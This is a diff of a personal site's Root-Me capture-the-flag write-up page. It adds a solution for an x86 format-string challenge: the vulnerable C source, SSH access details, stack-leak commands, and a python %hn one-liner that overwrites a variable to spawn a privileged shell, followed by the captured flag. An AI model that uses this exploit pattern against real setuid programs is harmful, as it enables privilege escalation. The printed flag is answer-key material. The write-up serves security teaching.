@@ -1,4 +1,4 @@
-# [Root-Me](./rootme.md) Root-Me App - System Challenges [5/83]
+# [Root-Me](./rootme.md) Root-Me App - System Challenges [6/83]
 
 These challenges will help you understand applicative vulnerabilities. 
 
@@ -9,7 +9,7 @@ These challenges will help you understand applicative vulnerabilities.
 3. [PE32 - Stack buffer overflow basic](#pe32-stack-buffer-overflow-basic) 🗸
 4. [ELF x86 - Format string bug basic 1](#elf-x86-format-string-bug-basic-1) 🗸
 5. [ELF x64 - Stack buffer overflow - basic](#elf-x64-stack-buffer-overflow-basic) 🗸
-6. [ELF x86 - Format string bug basic 2](#elf-x86-format-string-bug-basic-2)
+6. [ELF x86 - Format string bug basic 2](#elf-x86-format-string-bug-basic-2) 🗸
 7. [ELF x86 - Race condition](#elf-x86-race-condition)
 8. [ELF ARM - Stack buffer overflow - basic](#elf-arm-stack-buffer-overflow-basic)
 9. [ELF MIPS - Stack buffer overflow - No NX](#elf-mips-stack-buffer-overflow-no-nx)
@@ -560,7 +560,7 @@ $ scp -P 2225 app-systeme-ch72@challenge05.root-me.org:ch72.exe ~/Downloads/
  \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/|____/ 
                                  |___/ root-me.org      
 
-app-systeme-ch72@challenge05.root-me.org's password: 
+app-systeme-ch72@challenge05.root-me.orgs password: 
 ch72.exe                                                                                                                                                                                                    100%  104KB 977.1KB/s   00:00    
 $ ls
 ch72.exe
@@ -931,6 +931,147 @@ B4sicBufferOverflowExploitation
 
 ---
 
+## ELF x86 Format string bug basic 2
+
+- Author: Lyes
+- Date: 8 April 2015
+- Points: 20
+- Level: 2
+
+### Statement
+
+<details>
+
+<summary markdown="span">Source Code</summary>
+
+~~~c
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <sys/types.h>
+    #include <unistd.h>
+     
+    int main( int argc, char ** argv )
+     
+    {
+     
+            int var;
+            int check  = 0x04030201;
+     
+            char fmt[128];
+     
+            if (argc <2)
+                    exit(0);
+     
+            memset( fmt, 0, sizeof(fmt) );
+     
+            printf( "check at 0x%x\n", &check );
+            printf( "argv[1] = [%s]\n", argv[1] );
+     
+            snprintf( fmt, sizeof(fmt), argv[1] );
+     
+            if ((check != 0x04030201) && (check != 0xdeadbeef))    
+                    printf ("\nYou are on the right way !\n");
+     
+            printf( "fmt=[%s]\n", fmt );
+            printf( "check=0x%x\n", check );
+     
+            if (check==0xdeadbeef)
+            {
+                    printf("Yeah dude ! You win !\n");
+                    setreuid(geteuid(), geteuid());
+                    system("/bin/bash");
+            }
+    }
+~~~
+
+</details>
+
+### Connection Details
+
+- Host: challenge02.root-me.org
+- Protocol: SSH
+- Port:2222
+- SSH access: ssh -p 2222 app-systeme-ch14@challenge02.root-me.org 
+- Username: app-systeme-ch14
+- Password: app-systeme-ch14
+
+### Resources
+
+1. [PHRACK - Advances in format string exploitation](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20PHRACK%20-%20Advances%20in%20format%20string%20exploitation.pdf).
+2. [DEFCON 18 Advanced Format String Attacks](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20DEFCON%2018%20Advanced%20Format%20String%20Attacks.pdf).
+3. [Format String and Double-Free Attacks](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Format%20String%20and%20Double-Free%20Attacks.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution</summary>
+
+Reviewing the source code we can see the protected sprintf function that defines the buffer length, thus there is no buffer overflow risk:
+
+~~~c
+snprintf( fmt, sizeof(fmt), argv[1] );
+~~~
+
+We can also see the buffer, fmt, is limited to 128 bytes:
+
+~~~c
+char fmt[128];
+~~~
+
+We can extract data from the stack by using a memory pointer as argv:
+
+~~~shell
+app-systeme-ch14@challenge02:~$ ./ch14 %08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x
+check at 0xbffffa88
+argv[1] = [%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x]
+fmt=[080485f1,00000000,00000000,000000c2,bffffbd4,b7fe1449,f63d4e2e,04030201,34303830,31663538,3030302c,30303030,30302c30,30303030,3]
+check=0x4030201
+~~~
+
+This provides values from further up the stack.  We can see the "check" variable (0x04030201) in the stack.  We will need to overwrite this value with 0xdeadbeef to break into bash shell.  We can input some string to find the location of the fmt buffer in relation to the check variable in the stack, using 8x"a" = 0x61616161, 0x61616161, we can see the user input is adjacent to the check variable:
+
+~~~shell
+app-systeme-ch14@challenge02:~$ ./ch14 aaaaaaaa%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x
+check at 0xbffffa88
+argv[1] = [aaaaaaaa%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x]
+fmt=[aaaaaaaa080485f1,00000000,00000000,000000c2,bffffbd4,b7fe1449,f63d4e2e,04030201,61616161,61616161,34303830,31663538,3030302c,30]
+check=0x4030201
+~~~
+
+We can use %n in the user input to point to an address. We can format a user input with ADDRESS + %WIDTHx + $9%hn where ADDRESS = 0xbffffa88, $9%hn is the position in the stack of our input and WIDTH is a value that is written to change the check variable.  Due to limitations in the user input, we need to split this input to write to two addresses. The full command is:
+
+~~~shell
+app-systeme-ch14@challenge02:~$ ./ch14 $(python -c "print('\xb8\xfa\xff\xbf'+'\xba\xfa\xff\xbf'+'%48871x%9\$hn'+'%8126x%10\$hn')")
+check at 0xbffffab8
+argv[1] = [��������%48871x%9$hn%8126x%10$hn]
+fmt=[��������                                                                                                                       ]
+check=0xdeadbeef
+Yeah dude ! You win !
+app-systeme-ch14-cracked@challenge02:~$ cat .passwd
+1l1k3p0Rn&P0pC0rn
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+1l1k3p0Rn&P0pC0rn
+~~~
+
+</details>
+
+---
+
+### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+     
 Last updated April 2022.
 
 ## [djm89uk.github.io](https://djm89uk.github.io)
